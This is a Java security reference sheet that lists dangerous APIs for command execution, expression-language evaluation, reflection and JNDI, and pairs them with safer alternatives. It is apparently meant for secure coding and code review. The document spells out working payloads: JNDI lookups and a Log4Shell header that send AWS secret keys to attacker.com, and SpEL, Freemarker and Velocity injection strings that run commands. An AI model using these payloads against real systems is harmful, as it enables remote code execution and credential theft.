# Java RCE Reference — Dangerous APIs & Gadget Patterns

## OS Command Execution Sinks

| API | Risk | Notes |
|-----|------|-------|
| `Runtime.getRuntime().exec(String)` | CRITICAL | Single string — parsed by shell on some JVMs |
| `Runtime.getRuntime().exec(String[])` | CRITICAL | Array form — safer syntax but still dangerous if args are user-controlled |
| `new ProcessBuilder(List<String>)` | CRITICAL | Modern alternative, same risk |
| `new ProcessBuilder(String...)` | CRITICAL | Varargs form |
| `CommandLine.parse(String)` | CRITICAL | Apache Commons Exec — parses shell metacharacters |
| `"command".execute()` | CRITICAL | Groovy GDK extension method |

## Shell Metacharacters to Block

When input is used in command execution, the following characters must be blocked or escaped:
```
; && || | ` $ ( ) { } [ ] > < >> | & \n \r \0 ' "
```
URL-encoded: `%3B %26%26 %7C %60 %24 %0A %0D`

## Expression Language Sinks

| API | Risk | Notes |
|-----|------|-------|
| `SpelExpressionParser.parseExpression(userInput)` | CRITICAL | With `StandardEvaluationContext` |
| `SimpleEvaluationContext` | LOW | Limited capabilities — no reflection |
| `Velocity.evaluate(ctx, writer, logTag, userInput)` | CRITICAL | Template from user input |
| `freemarkerCfg.getTemplate(userControlledName)` | HIGH | Template name injection |
| `new Template("", new StringReader(userInput), ...)` | CRITICAL | Freemarker from string |
| `Ognl.getValue(userInput, ...)` | CRITICAL | OGNL from user input |
| `MVEL.eval(userInput)` | CRITICAL | MVEL expression from user input |
| `ScriptEngine.eval(userInput)` | CRITICAL | JavaScript/Groovy eval |
| `GroovyShell.evaluate(userInput)` | CRITICAL | Groovy shell |

## Reflection Sinks

| API | Risk | Notes |
|-----|------|-------|
| `Class.forName(userInput)` | HIGH | Loads arbitrary class |
| `classLoader.loadClass(userInput)` | HIGH | Dynamic class loading |
| `method.invoke(obj, args)` | HIGH | If method resolved from user input |
| `constructor.newInstance(args)` | HIGH | If class resolved from user input |
| `new URLClassLoader(urls)` | CRITICAL | Loads classes from remote URL |

## JNDI Injection (Log4Shell Pattern)

```java
// JNDI lookup with user-controlled string
new InitialContext().lookup("ldap://attacker.com/exploit")  // RCE via remote class
new InitialContext().lookup("rmi://attacker.com/exploit")
new InitialContext().lookup("dns://attacker.com/probe")     // blind exfil
```

**Log4Shell trigger pattern:**
```
User-Agent: ${jndi:ldap://attacker.com/${env:AWS_SECRET_ACCESS_KEY}}
```
Any log statement that logs the User-Agent, X-Forwarded-For, or other attacker-controlled headers is a trigger.

## SpEL Exploitation

With `StandardEvaluationContext`:
```
T(java.lang.Runtime).getRuntime().exec('id')
T(java.lang.ProcessBuilder).new(new String[]{'id'}).start()
''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')
```

## Freemarker/Velocity Payloads

```
${7*7}                                          # Confirm SSTI
${"freemarker.template.utility.Execute"?new()("id")}  # Freemarker RCE
#set($e="exp")
$e.class.forName("java.lang.Runtime").getMethod("exec","".class).invoke(...)  # Velocity
```

## Safe Alternatives

| Dangerous | Safe Alternative |
|-----------|-----------------|
| `Runtime.exec(String)` | Use library APIs instead of shelling out |
| `ProcessBuilder` with user args | Validate args against strict allowlist regex |
| SpEL `StandardEvaluationContext` | Use `SimpleEvaluationContext` |
| Template from user string | Pre-compiled templates only; no user-controlled template content |
| `ScriptEngine.eval(userInput)` | Avoid; if needed, use Nashorn with AccessControlContext sandbox |
| `Class.forName(userInput)` | Allowlist class names before loading |
